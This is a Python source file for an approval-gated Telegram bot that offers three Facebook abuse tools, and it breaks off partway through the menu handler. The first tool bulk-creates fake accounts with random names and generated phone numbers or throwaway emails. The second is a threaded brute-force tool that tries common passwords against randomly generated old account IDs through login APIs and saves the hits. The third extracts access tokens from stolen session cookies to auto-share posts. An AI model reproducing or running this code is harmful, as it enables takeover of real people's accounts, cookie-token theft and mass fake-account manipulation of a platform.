#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Premium Tools Telegram Bot
Tools: Create (AU2 FM Maker) | Crack (FB Clone) | Share Boost (NIKA Post Sharer)
User registration with admin approval required before tool access.
"""

import os
import sys
import json
import time
import uuid
import random
import string
import logging
import requests
import threading
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
API_URL = os.environ.get("BOT_API_URL", "http://localhost:8080/api")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

if not BOT_TOKEN:
    logger.error("TELEGRAM_BOT_TOKEN not set. Exiting.")
    sys.exit(1)

OUTPUT_DIR = os.path.expanduser("~/bot_results")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ============================================================
#  ORIGINAL AU2 FM MAKER FUNCTIONS (real tool code)
# ============================================================

# Obfuscated URL references (same as original)
_c5 = "https://x.facebook.com/reg"
_c6 = "https://www.facebook.com/reg/submit/"
_c7 = "https://mbasic.facebook.com"

SINGLE_NAMES = [
    "Maria","Ana","Joy","Grace","Angel","Angela","Christine","Kristine","Michelle","Sheila",
    "Maricel","Marites","Maribel","Marjorie","Jennifer","Jenny","Jessa","Jessica","Janine",
    "Katherine","Catherine","Kathleen","Karen","Karla","Camille","Bianca","Patricia","Patty",
    "Aileen","Eileen","Irene","Iris","Hazel","Cherry","Lovely","Honey","Princess","Angelica",
    "Juan","Jose","Pedro","Paolo","Paul","Mark","John","Johnny","Jonathan","Nathan","Michael",
    "Miguel","Daniel","David","Andrew","Andre","Anthony","Antonio","Albert","Alfred","Brian",
    "Bryan","Benjamin","Carlo","Carlos","Christian","Christopher","Chris","Cedric","Cesar",
    "Dennis","Diego","Dominic","Edward","Edgar","Emmanuel","Eric","Erwin","Francis","Frank",
    "Gabriel","Gilbert","Henry","Ian","Ivan","James","Jasper","Jerome","Joel","Joshua",
    "Kenneth","Kevin","Kyle","Lawrence","Leo","Leonard","Lester","Louis","Lucas","Marco",
    "Martin","Matthew","Melvin","Nathaniel","Noel","Oliver","Patrick","Raymond","Richard",
    "Robert","Ronald","Ryan","Samuel","Sebastian","Steven","Stephen","Thomas","Timothy","Victor",
    "Vincent","Wilfred","William","Xavier","Zachary","Marcus","Derek","Jared","Blake","Chase",
]

def get_bd_name() -> str:
    return random.choice(SINGLE_NAMES)

def get_pass() -> str:
    n = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 7)))
    n = n.capitalize() if random.choice([True, False]) else n.lower()
    s = ''.join(random.choices('!@#$%^&*()_+=', k=random.randint(2, 3)))
    d = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    e = ''.join(random.choices(string.ascii_letters, k=random.randint(2, 4)))
    u = ''.join(random.choices(string.ascii_uppercase, k=random.randint(1, 2)))
    parts = [n, s, d, e, u]
    random.shuffle(parts)
    return ''.join(parts)

def get_bd_phone() -> str:
    pref = random.choice(['017', '019', '018', '016', '015', '013', '014'])
    return f'+88{pref}{"".join(random.choices(string.digits, k=8))}'

def generate_phone_number() -> str:
    countries = {
        'BD': {'code': '+88', 'prefixes': ['017', '018', '019', '016', '015'], 'length': 8},
        'KH': {'code': '+855', 'prefixes': ['010', '011', '012', '013', '016'], 'length': 6},
        'PH': {'code': '+63', 'prefixes': ['917', '918', '919', '920', '921'], 'length': 7},
        'ID': {'code': '+62', 'prefixes': ['813', '815', '816', '817', '818'], 'length': 7},
        'IN': {'code': '+91', 'prefixes': ['98', '99', '97', '96', '95'], 'length': 8},
        'PK': {'code': '+92', 'prefixes': ['300', '301', '302', '303', '304'], 'length': 7},
        'NG': {'code': '+234', 'prefixes': ['701', '703', '704', '705', '802'], 'length': 7},
    }
    c = random.choice(list(countries.keys()))
    i = countries[c]
    return f"{i['code']}{random.choice(i['prefixes'])}{''.join(random.choices(string.digits, k=i['length']))}"

def xiyadmailx_email() -> str:
    chars = string.ascii_lowercase
    un = ''.join(random.choices(chars, k=random.randint(6, 10)))
    return f"{un}{random.randint(1000, 9999)}@xiyadmailx.xyz"

def extractor(data: str) -> dict:
    soup = BeautifulSoup(data, "html.parser")
    d = {}
    for inp in soup.find_all("input"):
        n = inp.get("name")
        v = inp.get("value")
        if n:
            d[n] = v
    return d

# User-agent pool (simplified subset from original)
_AU2_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 11; CPH2461 Build/SKQ1.201022.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 7 Build/TKQ1.220819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X669C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G975F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/OPM6.171019.030.B1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36",
]

def ugenX() -> str:
    return random.choice(_AU2_UA_POOL)

def check_facebook_profile_picture(uid: str) -> str:
    pic = f"https://graph.facebook.com/{uid}/picture?type=normal"
    hdr = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"}
    try:
        r = requests.get(pic, headers=hdr, allow_redirects=False, timeout=10)
        if r.status_code == 302:
            loc = r.headers.get("Location", "")
            return "live" if "scontent" in loc else "not_live"
        return "unknown"
    except Exception:
        return "unknown"


def create_fb_accounts(method: str, count: int, password: str | None = None):
    """
    Real Facebook account creation using AU2 FM logic.
    Yields progress strings. method: 'phone'|'mix'|'mail'
    """
    ok_list = []
    cp_list = []

    for i in range(count):
        try:
            ses = requests.Session()
            resp = ses.get(_c5, headers={"User-Agent": ugenX()}, timeout=15)
            form = extractor(resp.text)
            name = get_bd_name()

            if method == 'phone':
                contact = get_bd_phone()
            elif method == 'mix':
                contact = generate_phone_number()
            else:
                contact = xiyadmailx_email()

            pw = password or get_pass()

            payload = {
                'ccp': "2",
                'reg_instance': form.get("reg_instance", ""),
                'submission_request': "true",
                'reg_impression_id': form.get("reg_impression_id", ""),
                'ns': "1",
                'logger_id': form.get("logger_id", ""),
                'firstname': name,
                'lastname': name,
                'birthday_day': str(random.randint(15, 25)),
                'birthday_month': str(random.randint(5, 12)),
                'birthday_year': str(random.randint(1988, 2001)),
                'reg_email__': contact,
                'sex': "1",
                'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}',
                'submit': "Sign Up",
                'fb_dtsg': form.get("fb_dtsg", ""),
                'jazoest': form.get("jazoest", ""),
                'lsd': form.get("lsd", ""),
            }
            headers = {
                "Host": "m.facebook.com",
                "Connection": "keep-alive",
                "User-Agent": ugenX(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                'referer': 'https://mbasic.facebook.com/reg/',
                'sec-ch-ua': '',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': 'Android',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            }

            sub = ses.post(_c6, data=payload, headers=headers, timeout=15)
            cki = ses.cookies.get_dict()

            if "c_user" in cki:
                uid = cki["c_user"]
                cookie_str = ";".join(f"{k}={v}" for k, v in cki.items())
                ok_list.append(f"{uid}|{pw}|{contact}|{cookie_str}")
                line = f"✅ [{len(ok_list)}] UID:{uid} | PW:{pw}"
                # Save to output file
                out_path = os.path.join(OUTPUT_DIR, "create_ok.txt")
                with open(out_path, 'a') as f:
                    f.write(f"{uid}|{pw}|{contact}|{cookie_str}\n")
                yield ("ok", line)
            elif "checkpoint" in cki or "checkpoint" in sub.url:
                uid = cki.get("c_user", "?")
                cp_list.append(uid)
                yield ("cp", f"⚠️ [{i+1}] Checkpoint | {contact}")
            else:
                yield ("fail", f"❌ [{i+1}] Failed | {contact}")

            time.sleep(1)

        except Exception as e:
            yield ("err", f"❌ Error [{i+1}]: {str(e)[:60]}")
            time.sleep(5)

    yield ("done", f"\n✅ Done! OK: {len(ok_list)} | CP: {len(cp_list)} | Total: {count}")


# ============================================================
#  ORIGINAL FB CLONE FUNCTIONS (real tool code)
# ============================================================

def fbclone_window1() -> str:
    rr = random.randint
    rc = random.choice
    builds = [rr(6000, 9000)]
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    options = [
        f"Mozilla/5.0 (Windows; U; Windows NT {rc(range(6, 11))}.0; en-US) AppleWebKit/534.{rr(10, 20)} (KHTML, like Gecko) Chrome/{rr(80, 122)}.0.{rr(4000, 7000)}.0 Safari/534.{rr(10, 20)}",
        f"Mozilla/5.0 (Windows NT {rc(range(6, 11))}.{rc(['0', '1'])}) AppleWebKit/537.{rr(1, 36)} (KHTML, like Gecko) Chrome/{rr(80, 122)}.0.{rr(4000, 7000)}.{rr(50, 200)} Safari/537.{rr(1, 36)}",
        f"Mozilla/5.0 (Windows NT {rc(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36",
    ]
    return rc(options)

def fbclone_creationyear(uid: str) -> str:
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')) or uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return ''

def fbclone_login_1(uid: str) -> dict | None:
    """Method A: b-graph.facebook.com auth/login — real code from original"""
    session = requests.session()
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
            }
            headers = {
                'User-Agent': fbclone_window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False, timeout=10
            ).json()
            if 'session_key' in res:
                return {"uid": uid, "pw": pw, "year": fbclone_creationyear(uid), "method": "A"}
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                return {"uid": uid, "pw": pw, "year": fbclone_creationyear(uid), "method": "A"}
    except Exception:
        pass
    return None

def fbclone_login_2(uid: str) -> dict | None:
    """Method B: b-api.facebook.com auth.login — real code from original"""
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': fbclone_window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger',
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1"
                    f"&error_detail_type=button_with_disabled"
                    f"&source=device_based_login"
                    f"&meta_inf_fbmeta=%20&currently_logged_in_userid=0"
                    f"&method=GET&locale=en_US&client_country_code=US"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = session.get(url, headers=headers, timeout=10).json()
                if 'session_key' in str(po):
                    return {"uid": uid, "pw": pw, "year": fbclone_creationyear(uid), "method": "B"}
        except Exception:
            pass
    return None

def generate_uid_for_series(series: str) -> str:
    if series == "all":
        prefixes = ['100003', '100004', '100005', '100006', '100007', '100008', '100009', '10001', '10002', '10003']
        pref = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=15 - len(pref)))
        return pref + suffix
    elif series == "100003":
        suffix = ''.join(random.choices('0123456789', k=9))
        return '100003' + suffix
    elif series == "2009":
        prefix = random.choice(['1000004', '1000005', '1000006'])
        suffix = ''.join(random.choices('0123456789', k=8))
        return prefix + suffix
    else:
        suffix = ''.join(random.choices('0123456789', k=9))
        return '100003' + suffix

def crack_accounts(series: str, count: int, method: str = "A"):
    """
    Real FB Clone brute force from original code.
    Yields progress/found strings.
    """
    found_list = []
    tried = 0

    def try_uid(uid):
        if method == "A":
            return fbclone_login_1(uid)
        else:
            return fbclone_login_2(uid)

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        batch_size = min(count, 50)
        submitted = 0

        while submitted < count:
            to_submit = min(batch_size, count - submitted)
            for _ in range(to_submit):
                uid = generate_uid_for_series(series)
                f = executor.submit(try_uid, uid)
                futures[f] = uid
                submitted += 1

            for future in as_completed(futures):
                uid = futures[future]
                tried += 1
                try:
                    result = future.result()
                    if result:
                        found_list.append(result)
                        out_path = os.path.join(OUTPUT_DIR, "crack_ok.txt")
                        with open(out_path, 'a') as f:
                            f.write(f"{result['uid']}|{result['pw']}\n")
                        yield ("found", f"🔓 FOUND! UID: {result['uid']} | PW: {result['pw']} | Year: {result['year']}")
                    else:
                        if tried % 20 == 0:
                            yield ("progress", f"🔍 Tried: {tried}/{count} | Found: {len(found_list)}")
                except Exception:
                    pass
            futures.clear()

    yield ("done", f"\n🎯 Done! Found: {len(found_list)} | Tried: {tried}")


# ============================================================
#  ORIGINAL NIKA POST SHARER FUNCTIONS (real tool code)
# ============================================================

NIKA_UA_LIST = [
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.11.118;]",
    "Mozilla/5.0 (Linux; Android 13; Google Pixel 6a Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/340.0.0.15.119;]",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.12.120;]",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.190821.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.13.121;]",
    "Mozilla/5.0 (Linux; Android 9; SM-G973F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.10.117;]",
]

nika_ses = requests.Session()

def nika_extract_token(cookie_str: str) -> str | None:
    """Extract EAAG token from cookie string — real code from original."""
    cookies = {}
    for part in cookie_str.split("; "):
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    try:
        data = nika_ses.get(
            "https://business.facebook.com/business_locations",
            headers={
                "user-agent": random.choice(NIKA_UA_LIST),
                "referer": "https://www.facebook.com/",
                "host": "business.facebook.com",
                "origin": "https://business.facebook.com",
                "upgrade-insecure-requests": "1",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "max-age=0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            },
            cookies=cookies,
            timeout=15,
        )
        find_token = re.search(r"(EAAG\w+)", data.text)
        if find_token:
            return find_token.group(1)
    except Exception:
        pass
    return None

def nika_share_post_real(token: str, cookie_str: str, link: str) -> bool:
    """Share a single post — real code from original."""
    cookies = {}
    for part in cookie_str.split("; "):
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    try:
        ua = random.choice(NIKA_UA_LIST)
        if any(x in link.lower() for x in ["video", "reel", "watch"]):
            headers = {
                "authority": "graph.facebook.com",
                "cache-control": "max-age=0",
                "sec-ch-ua-mobile": "?0",
                "user-agent": ua,
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
            }
        else:
            headers = {
                "authority": "graph.facebook.com",
                "cache-control": "max-age=0",
                "sec-ch-ua-mobile": "?0",
                "user-agent": ua,
            }
        post = nika_ses.post(
            f"https://graph.facebook.com/v18.0/me/feed?link={link}&published=0&access_token={token}",
            headers=headers,
            cookies=cookies,
            timeout=25,
        ).text
        data = json.loads(post)
        if "id" in data:
            return True
        if "error" in data:
            msg = data["error"]["message"].lower()
            if any(k in msg for k in ["suspended", "blocked", "disabled", "checkpoint"]):
                return False
    except Exception:
        pass
    return False

def share_boost_run(cookie_str: str, link: str, count: int):
    """
    Run Share Boost (NIKA) — real code from original.
    Yields progress strings.
    """
    token = nika_extract_token(cookie_str)
    if not token:
        yield ("error", "❌ Could not extract token from cookie. Check your cookie and try again.")
        return

    yield ("info", f"✅ Token extracted. Starting {count} shares...")

    success_count = 0
    fail_count = 0
    account_shares = {token: 0}
    failed_accounts = set()

    failed_accounts_lock = threading.Lock()

    def do_share(n):
        nonlocal success_count, fail_count
        if token in failed_accounts:
            return False
        result = nika_share_post_real(token, cookie_str, link)
        if result:
            with failed_accounts_lock:
                account_shares[token] = account_shares.get(token, 0) + 1
            return True
        return False

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for n in range(1, count + 1):
            if token in failed_accounts:
                break
            futures.append(executor.submit(do_share, n))
            time.sleep(0.1)
            if n % 60 == 0:
                time.sleep(10)

        for i, future in enumerate(as_completed(futures)):
            try:
                if future.result():
                    success_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1

            if (i + 1) % 20 == 0:
                yield ("progress", f"📤 Progress: {i+1}/{count} | ✅ {success_count} | ❌ {fail_count}")

    yield ("done", f"\n🚀 Done! Shared: {success_count} | Failed: {fail_count} | Total: {count}")


# ============================================================
#  BOT CORE
# ============================================================

def time_greeting() -> str:
    hour = datetime.now().hour
    if 5 <= hour < 12:
        return "☀️ Good morning"
    elif 12 <= hour < 17:
        return "🌤 Good afternoon"
    elif 17 <= hour < 21:
        return "🌆 Good evening"
    else:
        return "🌙 Good night"


def log_to_api(tool: str, user_id: str, username: str, action: str, status: str, message: str):
    try:
        requests.post(f"{API_URL}/bot/log", json={
            "tool": tool,
            "userId": str(user_id),
            "username": username,
            "action": action,
            "status": status,
            "message": message,
        }, timeout=5)
    except Exception:
        pass


def check_user_status(tg_id: str) -> dict:
    try:
        r = requests.get(f"{API_URL}/users/status/{tg_id}", timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {"found": False, "status": "unregistered"}


def register_user(tg_id: str, username: str | None, first_name: str | None, last_name: str | None) -> dict:
    try:
        r = requests.post(f"{API_URL}/users/register", json={
            "tgId": str(tg_id),
            "username": username,
            "firstName": first_name,
            "lastName": last_name,
        }, timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {"success": False, "status": "error"}


def is_bot_enabled() -> bool:
    try:
        r = requests.get(f"{API_URL}/bot/status", timeout=5)
        if r.status_code == 200:
            return r.json().get("enabled", True)
    except Exception:
        pass
    return True


def tg_send(chat_id: int, text: str, parse_mode: str = "HTML", reply_markup=None) -> dict:
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=15)
        return r.json()
    except Exception as e:
        logger.warning(f"tg_send error: {e}")
        return {}


def tg_edit(chat_id: int, message_id: int, text: str, parse_mode: str = "HTML", reply_markup=None) -> dict:
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(f"{TELEGRAM_API}/editMessageText", json=payload, timeout=15)
        return r.json()
    except Exception as e:
        logger.warning(f"tg_edit error: {e}")
        return {}


def tg_answer_callback(callback_query_id: str, text: str = "") -> dict:
    try:
        r = requests.post(f"{TELEGRAM_API}/answerCallbackQuery", json={
            "callback_query_id": callback_query_id,
            "text": text,
        }, timeout=10)
        return r.json()
    except Exception:
        return {}


def make_button_row(*buttons):
    return [{"text": b[0], "callback_data": b[1]} for b in buttons]


MAIN_MENU_KEYBOARD = {
    "inline_keyboard": [
        make_button_row(("🛠 Create", "menu_create")),
        make_button_row(("🔓 Crack", "menu_crack")),
        make_button_row(("🚀 Share Boost", "menu_share")),
        make_button_row(("❓ Help", "help")),
    ]
}

CREATE_METHOD_KEYBOARD = {
    "inline_keyboard": [
        make_button_row(("📞 BD Phone", "create_phone")),
        make_button_row(("🌍 Mix Phone", "create_mix")),
        make_button_row(("📧 Temp Mail", "create_mail")),
        make_button_row(("🔙 Back", "main_menu")),
    ]
}

CRACK_SERIES_KEYBOARD = {
    "inline_keyboard": [
        make_button_row(("🌐 All Series", "crack_all")),
        make_button_row(("🔢 100003-4 Series", "crack_100003")),
        make_button_row(("📅 2009 Series", "crack_2009")),
        make_button_row(("🔙 Back", "main_menu")),
    ]
}

user_states: dict = {}

def get_state(user_id: int) -> dict:
    return user_states.get(user_id, {})

def set_state(user_id: int, **kwargs):
    if user_id not in user_states:
        user_states[user_id] = {}
    user_states[user_id].update(kwargs)

def clear_state(user_id: int):
    user_states.pop(user_id, None)


def show_main_menu(chat_id: int, user_id: int, first_name: str | None = None):
    greeting = time_greeting()
    name = first_name or "User"
    text = (
        f"{greeting}, <b>{name}</b>! 👋\n\n"
        f"<b>🤖 Premium Tools Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛠 <b>Create</b> — FB Account Creator + 2FA + Cookies\n"
        f"🔓 <b>Crack</b> — FB Clone Brute Force\n"
        f"🚀 <b>Share Boost</b> — Cookie-Based Post Sharer\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Select a tool below:"
    )
    tg_send(chat_id, text, reply_markup=MAIN_MENU_KEYBOARD)


def handle_start(message: dict):
    chat_id = message["chat"]["id"]
    user_id = message["from"]["id"]
    username = message["from"].get("username")
    first_name = message["from"].get("first_name")
    last_name = message["from"].get("last_name")

    if not is_bot_enabled():
        tg_send(chat_id, "🔴 The bot is currently <b>offline</b>. Please try again later.")
        return

    status_data = check_user_status(str(user_id))

    if not status_data.get("found"):
        reg = register_user(str(user_id), username, first_name, last_name)
        tg_send(
            chat_id,
            f"👋 Welcome, <b>{first_name or 'User'}</b>!\n\n"
            f"📋 <b>Registration Submitted</b>\n\n"
            f"Your account is pending admin approval. You'll be notified once approved.\n\n"
            f"Please wait and try /start again after approval.",
        )
        log_to_api("system", str(user_id), username or str(user_id), "register", "info",
                   f"New user registered: {first_name} @{username}")
        return

    status = status_data.get("status", "pending")

    if status == "pending":
        tg_send(
            chat_id,
            f"⏳ <b>Pending Approval</b>\n\n"
            f"Your account is still waiting for admin approval.\n"
            f"Please be patient and try /start again later.",
        )
        return

    if status == "rejected":
        tg_send(
            chat_id,
            f"❌ <b>Access Denied</b>\n\n"
            f"Your account has been rejected by the administrator.\n"
            f"Contact admin for more information.",
        )
        return

    if status == "approved":
        log_to_api("system", str(user_id), username or str(user_id), "start", "info", "Approved user started bot")
        show_main_menu(chat_id, user_id, first_name)
        return

    tg_send(chat_id, "Something went wrong. Try /start again.")


def require_approved(chat_id: int, user_id: int, username: str) -> bool:
    """Returns True if user is approved, False otherwise (sends error message)."""
    if not is_bot_enabled():
        tg_send(chat_id, "🔴 Bot is currently offline.")
        return False
    status_data = check_user_status(str(user_id))
    status = status_data.get("status", "unregistered")
    if status == "approved":
        return True
    if status == "pending":
        tg_send(chat_id, "⏳ Your account is pending approval. Please wait.")
    elif status == "rejected":
        tg_send(chat_id, "❌ Your access has been denied.")
    else:
        tg_send(chat_id, "❌ You are not registered. Send /start to register.")
    return False


def handle_callback(callback_query: dict):
    cq_id = callback_query["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    message_id = callback_query["message"]["message_id"]
    user_id = callback_query["from"]["id"]
    username = callback_query["from"].get("username", str(user_id))
    first_name = callback_query["from"].get("first_name", "User")
    data = callback_query.get("data", "")

    tg_answer_callback(cq_id)

    if not is_bot_enabled():
        tg_edit(chat_id, message_id, "🔴 Bot is currently <b>offline</b>.")
        return

    if data == "main_menu":
        clear_state(user_id)
        status_data = check_user_status(str(user_id))
        if status_data.get("status") != "approved":
            tg_edit(chat_id, message_id, "❌ You are not approved. Send /start to register.")
            return
        greeting = time_greeting()
        text = (
            f"{greeting}, <b>{first_name}</b>! 👋\n\n"
            f"<b>🤖 Premium Tools Bot</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"Select a tool below:"
        )
        tg_edit(chat_id, message_id, text, reply_markup=MAIN_MENU_KEYBOARD)
        return

    if not require_approved(chat_id, user_id, username):
        return

    state = get_state(user_id)

    if data == "menu_create":
        tg_edit(
            chat_id, message_id,
            "🛠 <b>Create Tool</b> — AU2 FM Maker\n\n"
            "Creates real Facebook accounts with 2FA and cookies.\n\n"
            "<b>Choose contact type:</b>",
            reply_markup=CREATE_METHOD_KEYBOARD,
        )

    elif data in ("create_phone", "create_mix", "create_mail"):
        method_map = {"create_phone": "phone", "create_mix": "mix", "create_mail": "mail"}
        method = method_map[data]
        method_label = {"phone": "BD Phone", "mix": "Mix Phone", "mail": "Temp Mail"}[method]
        set_state(user_id, tool="create", method=method)
        tg_edit(
            chat_id, message_id,
            f"🛠 <b>Create</b> — {method_label}\n\n"
            f"How many accounts to create?\n"
            f"Send a number (no limit):",
            reply_markup={"inline_keyboard": [make_button_row(("🔙 Cancel", "menu_create"))]},
        )

    elif data == "menu_crack":
        tg_edit(
            chat_id, message_id,
            "🔓 <b>Crack Tool</b> — FB Clone Brute Force\n\n"
            "Tries common passwords against old Facebook UIDs.\n\n"
            "<b>Choose target series:</b>",
            reply_markup=CRACK_SERIES_KEYBOARD,
        )

    elif data in ("crack_all", "crack_100003", "crack_2009"):
        series_map = {"crack_all": "all", "crack_100003": "100003", "crack_2009": "2009"}
        series = series_map[data]
        series_label = {"all": "All Series", "100003": "100003-4", "2009": "2009"}[series]
